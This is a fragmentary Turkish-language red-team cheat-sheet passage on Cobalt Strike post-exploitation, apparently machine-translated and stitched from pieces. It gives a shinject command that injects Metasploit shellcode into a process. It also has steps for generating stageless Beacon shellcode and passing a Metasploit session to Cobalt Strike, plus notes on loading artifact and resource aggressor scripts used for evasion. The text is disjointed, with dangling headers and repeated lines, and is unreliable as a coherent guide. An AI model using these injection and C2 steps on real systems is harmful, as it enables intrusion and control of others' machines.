...
## Yeni bilet ile kullanılacak yeni bir oturum açma oturumu oluştur (ele geçirilen olanı geçmemek için)
...
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin # Metasploit shellcode'u x64 sürecine enjekte et

# Metasploit oturumunu cobalt strike'a geç
## Stageless Beacon shellcode'u oluşturun, Saldırılar > Paketler > Windows Executable (S) kısmına gidin, istenen dinleyiciyi seçin, Çıktı türü olarak Raw'ı seçin ve x64 payload kullanın.
## Oluşturulan cobalt strike shellcode'unu enjekte etmek için metasploit'te post/windows/manage/shellcode_inject kullanın
...
```
Aggressive script `dist-pipe\artifact.cna` dosyasını yüklemeyi unutmayın, böylece Cobalt Strike'ın kullanmak istediğimiz disk kaynaklarını kullanmasını ve yüklenenleri değil.
...
Cobalt Strike'a kullanmak istediğimiz diskten kaynakları belirtmek için `ResourceKit\resources.cna` agresif betiğini yüklemeyi unutmayın ve yüklü olanları değil.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
